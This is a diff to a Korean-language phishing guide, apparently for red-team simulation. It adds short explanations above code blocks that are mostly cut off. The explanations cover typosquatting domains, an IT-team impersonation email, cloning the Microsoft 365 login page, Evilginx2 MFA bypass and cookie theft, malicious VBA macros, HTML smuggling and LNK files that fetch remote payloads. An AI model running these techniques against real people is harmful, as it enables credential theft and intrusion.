@@ -18,6 +18,9 @@
 
 ### GoPhish 피싱 플랫폼
 
+
+GoPhish 피싱 시뮬레이션 플랫폼 설정 명령어입니다. 관리자 패널에서 발송 프로파일·이메일 템플릿·랜딩 페이지를 설정하고 캠페인을 실행하면 직원의 피싱 인식 수준과 클릭률을 측정할 수 있습니다.
+
 ```bash
 # GoPhish 설치
 wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
@@ -51,6 +54,8 @@ EOF
 
 ### 피싱 도메인 준비
 
+타이포스쿼팅 도메인을 검색하여 피싱 캠페인에 사용할 도메인을 준비합니다. 목표 도메인과 시각적으로 유사한 도메인을 등록합니다.
+
 ```bash
 # 타이포스쿼팅 도메인 탐색
 # company.com → conpany.com, cornpany.com, company.co, etc.
@@ -68,6 +73,8 @@ certbot certonly --standalone -d phish-domain.com
 ```
 
 ### 전문적인 피싱 이메일 템플릿
+
+IT 보안 팀을 사칭한 피싱 이메일 HTML 템플릿입니다. 긴급성과 권위감을 이용하여 피해자가 링크를 클릭하거나 자격증명을 입력하도록 유도합니다.
 
 ```html
 <!-- IT 보안 팀 사칭 피싱 이메일 -->
@@ -129,6 +136,8 @@ certbot certonly --standalone -d phish-domain.com
 
 ### Microsoft 365 피싱 페이지 클론
 
+HTTrack으로 Microsoft 365 로그인 페이지를 복제합니다. 피싱 페이지를 통해 입력된 자격증명을 캡처하는 크리덴셜 하비스팅에 사용합니다.
+
 ```bash
 # HTTrack으로 로그인 페이지 복제
 httrack "https://login.microsoftonline.com" -O ./clone/
@@ -141,6 +150,8 @@ wget --mirror --convert-links --page-requisites \
 ```
 
 ### Evilginx2 설정
+
+Evilginx2는 역방향 프록시 방식으로 MFA도 우회하는 피싱 프레임워크입니다. Phishlets로 대상 서비스를 모방하고 세션 쿠키를 탈취합니다.
 
 ```bash
 # Evilginx2 설치
@@ -217,6 +228,8 @@ SPF/DKIM 우회 기법:
 
 ### 매크로 기반 Office 문서
 
+악성 VBA 매크로를 포함한 Office 문서를 생성합니다. 피해자가 매크로를 활성화하면 셸코드나 파워셸 명령이 실행되어 초기 접근을 획득합니다.
+
 ```vba
 ' VBA 매크로 (Office 2010-2016 환경)
 Sub AutoOpen()
@@ -244,6 +257,8 @@ doc.generate("악성_문서.docx")
 ```
 
 ### HTML Smuggling
+
+HTML Smuggling으로 방화벽과 이메일 게이트웨이를 우회합니다. JavaScript로 바이너리를 동적으로 재조립하여 악성 파일을 피해자 브라우저에 전달합니다.
 
 ```html
 <!DOCTYPE html>
@@ -279,6 +294,8 @@ window.onload = downloadPayload;
 ```
 
 ### LNK 파일 페이로드
+
+악성 LNK(바로가기) 파일을 생성합니다. 클릭 시 PowerShell이나 cmd를 통해 원격 페이로드를 다운로드하고 실행합니다.
 
 ```powershell
 # PowerShell로 악성 LNK 생성
@@ -324,6 +341,9 @@ $shortcut.Save()
 ---
 
 ## 6. 피싱 시뮬레이션 측정 지표
+
+
+피싱 공격 자동화 스크립트입니다. 개인화된 스피어피싱 이메일을 대량 발송하거나, 피해자의 반응(클릭, 자격증명 입력)을 추적하는 서버를 구성하는 데 활용됩니다.
 
 ```python
 #!/usr/bin/env python3
